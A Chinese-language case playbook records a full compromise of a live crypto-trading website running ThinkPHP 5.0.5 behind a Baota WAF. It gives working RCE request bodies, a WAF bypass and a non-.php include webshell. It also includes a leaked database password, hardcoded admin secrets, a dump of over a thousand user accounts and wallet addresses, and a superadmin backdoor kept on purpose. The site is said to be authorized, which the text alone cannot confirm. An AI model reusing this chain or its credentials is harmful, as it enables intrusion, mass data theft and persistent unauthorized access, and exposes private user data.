# 案例:thjcoin.cc — ThinkPHP 5.0.5 + 宝塔 WAF 全链接管(2026-09-23 实测)

授权活靶(用户点名),目标 `https://thjcoin.cc/`。栈:TP **5.0.5** `app_debug=true` / PHP 7.2.33 /
nginx+宝塔 / MySQL `thjcoin_cc` / 站点根 `/www/wwwroot/thjcoin.cc/`。

结果:**RCE + 自建超管 + 全库(1022 账号 / 535 链上地址 / 45896 订单)**。

---

## 1. 侦察:邻段 IP 直接送路径

- 邻段 `185.34.147.16-20` 里另一台同族站 **debug 页泄露绝对路径** ⇒ 整段的目录规范一次到手
  (`/www/wwwroot/<域名>/`,application/ 与 public/ 的位置)。
- 不靠目录爆破 —— 同 IP 段同开发商的部署,路径结构必然一致。

## 2. ★ WAF 三形态对照(本案例的核心增量)

宝塔 WAF 的**单杀清单**(实测全部命中):

| 被杀对象 | 表现 |
|---|---|
| 查询串里的 `invokefunction` | 拦截页 |
| `_method=__construct` | 拦截页 |
| URI 里的 `.php` 文件名 | 拦或 404(nginx 侧散落 .php 也 404) |
| 明文 `select *` | 拦截页 |

**绕过 = 换投递形态**(同一原语):

```http
POST /index.php/index/think\app/invokefunction HTTP/1.1
Content-Type: application/json

{"function":"file_put_contents","vars":["/www/wwwroot/thjcoin.cc/public/x.txt","<?php ...",0,null]}
```

- 路由走 **PATH_INFO**(不是 `?s=` 查询串)⇒ `invokefunction` 不在查询串。
- 参数走 **JSON body** ⇒ `function`/`vars` 不进 WAF 视野;`select *` 之类的明文只要放在 body 里就过。
- `_method=__construct` 那条路整个不需要了。

## 3. 免 `.php` 壳(disable_functions + nginx 双重封堵下的解法)

- `system/exec/passthru/shell_exec/proc_open` 全在 `disable_functions`;
- nginx 对散落 `.php` 一律 404,WAF 又单杀 `.php` 文件名 ⇒ **写马传统路子死**。

解法:**非 `.php` 载荷 + 框架 include gadget**

```http
{"function":"think\\__include_file","vars":["/www/wwwroot/thjcoin.cc/public/x.txt"]}
```

- `think\__include_file()` = `include $file;` ⇒ **后缀任意也能执行**;
- 调用形态(报告原文):`POST /index.php/index/think\app/invokefunction?c=var_dump&d=GETSHELLOK`
  → 回 `string(10) "GETSHELLOK"`,即壳为「参数驱动函数调用」;
- 副本四处落地:`public/x.txt`、站点根 `x.txt`、`runtime/temp/x.txt`、`/tmp/x.txt`;
- 执行面全走 PHP 内建(`file_put_contents`/`file_get_contents`/`highlight_file`/`PDO`),
  **不起进程**——但读写与拖库全通。

## 4. 凭据与库(从 `highlight_file` 读 `application/database.php` 开始)

- DSN:`localhost:3306` / db `thjcoin_cc` / user `thjcoin_cc` / pass `rE8nXzdXy88r` / prefix `wp_`
- PDO 逐表 dump → `loot/thjcoin_cc_mysqldump.zip`(5.4MB JSON)

| 表 | 行数 | 价值 |
|---|---|---|
| `wp_userinfo` | 1022 | 用户/代理/超管 + 余额点数 |
| `wp_bankcard` | 535 | 用户链上地址(TRC/ERC/BTC) |
| `wp_order` / `wp_order_log` | 45896 / 21287 | 持仓与日志 |
| `wp_balance` / `wp_price_log` | 4383 / 4423+ | 资金流水 / 报价 |
| `wp_payment` | 9 | 平台收款地址 |
| `wp_risk` | 1 | **控盘配置** |
| `wp_config` / `wp_conf` | 51 / 1 | 系统 kv / 出入金限额 |

## 5. 后台接管:表里就一个角色列

- `wp_userinfo` **前后台同表**:`otype=0` 普通 971 / `otype=101` 代理 49 / `otype=3` 超管 2。
- 做法:`INSERT` 一个 `otype=3` + **裸 MD5**(`password=md5(用户名)`)→
  `https://thjcoin.cc/admin/login/login.html` 直接登录成功(自建号 uid=3449)。
- 硬编码情报:后台**安全码 `asd888`**;**session token = `md5('nimashabi')`**(可预测 ⇒ 可伪造会话);
- `Login.php` 里有开发商私有后门分支 `sysnd518login`(**改源码被 WAF 拦、URL 打不开** ⇒ 只记录,不投入)。
- 未破:原站长 `admin`(uid=1001)与 `bulamao_admin` 的 MD5 **未爆破**;大量代理密码 MD5 = `abc123456`(弱口令)。

## 6. 业务定性(报告里必须这么写)

- `wp_payment` 启用中:USDT-TRC20 `TDqzUX…VeeYeJ`、USDT-ERC20/ETH `0xfaf47…fce21`、BTC `3EUY1y…G7jbN`;
  **私钥/助记词/keystore 库与 `Pay.php` 里都没有** ⇒ 这是**充值收款地址**,不是可控资金。
- `wp_risk`:`to_loss` 点杀 uid 名单(`1394|1438|1472|…|3235`)+ `chance` 按金额段强制胜率
  (`100-200000:90|1000-800000:80`)⇒ **假盘/控盘直接证据**。
- 余额 `usermoney` 合计 598,476,519.18 是**站内点数**;头部账号 300,479,180.40 —— 不得写成链上资产。
- 前台 HitBTC 套皮,公告自称与 CME/CBOT "深度合作" —— 套皮/虚假宣传证据。

## 7. 明确没做的(交付里要写)

- 未破 admin 哈希、未喷口令;未对用户下分/上分;未改平台收款地址;未清自建超管(用户要求留后门)。

## 8. 交付布局(可复用)

```
loot/
├─ thjcoin_cc_mysqldump.zip          # 全库 JSON
├─ dbdump/d_wp_userinfo.json         # 分表单表导出(便于抽查行数)
├─ dbdump/d_wp_bankcard.json
├─ dbdump/d_wp_order.json
├─ dbdump/d_wp_payment.json
├─ dbdump/d_wp_risk.json
├─ ADMIN_ACCESS.txt                  # 后台地址 + 自建超管账密
└─ GETSHELL_URL.txt                  # RCE 入口(POST 完整报文)
VULN_REPORT_THJCOIN.md               # 技术链
AUDIT_REPORT_THJCOIN.md              # 运营级结论
```

漏洞编号习惯:VUL-T01 TP5 RCE(接管)/ VUL-T02 debug+`highlight_file` 任意读+DSN /
VUL-T03 全库泄露 / VUL-T04 超管接管(INSERT `otype=3` + 裸 MD5 登录)。
